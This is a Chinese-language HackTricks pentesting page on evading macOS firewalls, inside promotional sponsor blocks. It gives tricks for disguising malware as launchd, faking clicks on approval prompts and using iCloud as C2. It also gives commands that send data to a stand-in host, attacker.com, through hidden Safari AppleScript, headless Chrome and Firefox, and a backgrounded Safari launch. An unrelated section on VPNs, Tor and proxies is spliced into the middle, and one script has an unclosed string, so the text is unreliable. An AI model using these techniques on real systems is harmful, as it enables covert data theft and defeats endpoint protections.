# macOS绕过防火墙

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks云 ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 推特 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 YouTube 🎥</strong></a></summary>

* 你在一家**网络安全公司**工作吗？想要在HackTricks中看到你的**公司广告**吗？或者你想要**获取PEASS的最新版本或下载PDF格式的HackTricks**吗？请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
* 发现我们的独家[**NFTs**](https://opensea.io/collection/the-peass-family)收藏品——[**The PEASS Family**](https://opensea.io/collection/the-peass-family)
* 获取[**官方PEASS和HackTricks周边产品**](https://peass.creator-spring.com)
* **加入**[**💬**](https://emojipedia.org/speech-balloon/) [**Discord群组**](https://discord.gg/hRep4RUj7f)或[**电报群组**](https://t.me/peass)，或者**关注**我在**Twitter**上的[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**。**
* **通过向**[**hacktricks repo**](https://github.com/carlospolop/hacktricks) **和**[**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **提交PR来分享你的黑客技巧。**

</details>

## 发现的技术

以下技术在某些macOS防火墙应用中发现有效。

### 滥用白名单名称

* 例如，将恶意软件命名为已知的macOS进程名称，如**`launchd`**&#x20;

### 合成点击

* 如果防火墙要求用户授权，请使恶意软件**点击允许**

### 使用Apple签名的二进制文件

* 像**`curl`**这样的二进制文件，还有其他一些，如**`whois`**

### 众所周知的苹果域名

防火墙可能允许与众所周知的苹果域名建立连接，例如**`apple.com`**或**`icloud.com`**。iCloud可以用作C2。

### 通用绕过方法

一些尝试绕过防火墙的想法

### 检查允许的流量

了解允许的流量将帮助您识别可能被列入白名单的域名或允许访问它们的应用程序
```bash
lsof -i TCP -sTCP:ESTABLISHED
```
### 滥用 DNS

DNS 解析是通过已签名的应用程序 **`mdnsreponder`** 进行的，该应用程序可能会被允许与 DNS 服务器通信。

<figure><img src="../../.gitbook/assets/image (1) (1) (6).png" alt=""><figcaption></figcaption></figure>

### 通过浏览器应用程序

* **oascript**
```applescript
tell application "Safari"
run
tell application "Finder" to set visible of process "Safari" to false
make new document
set the URL of document 1 to "https://attacker.com?data=data%20to%20exfil
end tell
```
* 谷歌浏览器

{% code overflow="wrap" %}
```bash
"Google Chrome" --crash-dumps-dir=/tmp --headless "https://attacker.com?data=data%20to%20exfil"
```
{% endcode %}

* Firefox
```bash
firefox-bin --headless "https://attacker.com?data=data%20to%20exfil"
```
# 绕过 macOS 防火墙

## Safari

Safari 是 macOS 的默认浏览器，它具有一些功能可以帮助绕过防火墙。

### 1. 使用代理服务器

Safari 允许您配置代理服务器，以便通过绕过防火墙来访问受限制的网站。您可以在 Safari 的偏好设置中找到代理服务器选项，并输入代理服务器的地址和端口。

### 2. 使用 VPN

使用虚拟私人网络（VPN）是绕过防火墙的另一种方法。通过连接到 VPN，您可以隐藏您的真实 IP 地址，并通过 VPN 服务器访问受限制的网站。在 macOS 上，您可以在系统偏好设置中配置 VPN。

### 3. 使用 Tor 浏览器

Tor 浏览器是一个匿名浏览器，可以帮助您绕过防火墙并保护您的隐私。它通过将您的流量通过多个中继节点进行路由来隐藏您的真实 IP 地址。您可以在 Tor 项目的官方网站上下载和安装 Tor 浏览器。

### 4. 使用 SSH 隧道

使用 SSH 隧道是另一种绕过防火墙的方法。您可以通过 SSH 连接到远程服务器，并将本地端口转发到远程服务器上的受限制的端口。这样，您就可以通过本地端口访问受限制的网站。要创建 SSH 隧道，请使用以下命令：

```bash
ssh -L <本地端口>:<目标服务器>:<目标端口> <用户名>@<远程服务器>
```

### 5. 使用代理工具

还有一些第三方代理工具可以帮助您绕过防火墙。例如，Proxifier 是一款流行的代理工具，可以将应用程序的流量通过代理服务器进行路由。您可以在 Proxifier 的官方网站上下载和安装它。

请注意，绕过防火墙可能违反您所在地区的法律和政策。在尝试绕过防火墙之前，请确保您了解相关法律和政策，并获得适当的授权。
```bash
open -j -a Safari "https://attacker.com?data=data%20to%20exfil"
```
### 通过进程注入

如果你能够将代码注入到一个允许连接到任何服务器的进程中，你就可以绕过防火墙的保护：

{% content-ref url="macos-proces-abuse/" %}
[macos-proces-abuse](macos-proces-abuse/)
{% endcontent-ref %}

## 参考资料

* [https://www.youtube.com/watch?v=UlT5KFTMn2k](https://www.youtube.com/watch?v=UlT5KFTMn2k)

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* 你在一家**网络安全公司**工作吗？想要在HackTricks中**为你的公司做广告**吗？或者你想要**获取最新版本的PEASS或下载PDF格式的HackTricks**吗？请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
* 发现我们的独家[NFT收藏品](https://opensea.io/collection/the-peass-family)——[**The PEASS Family**](https://opensea.io/collection/the-peass-family)
* 获得[**官方PEASS和HackTricks周边产品**](https://peass.creator-spring.com)
* **加入**[**💬**](https://emojipedia.org/speech-balloon/) [**Discord群组**](https://discord.gg/hRep4RUj7f)或[**电报群组**](https://t.me/peass)，或者**关注**我在**Twitter**上的[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**。**
* **通过向**[**hacktricks repo**](https://github.com/carlospolop/hacktricks) **和**[**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **提交PR来分享你的黑客技巧。**

</details>
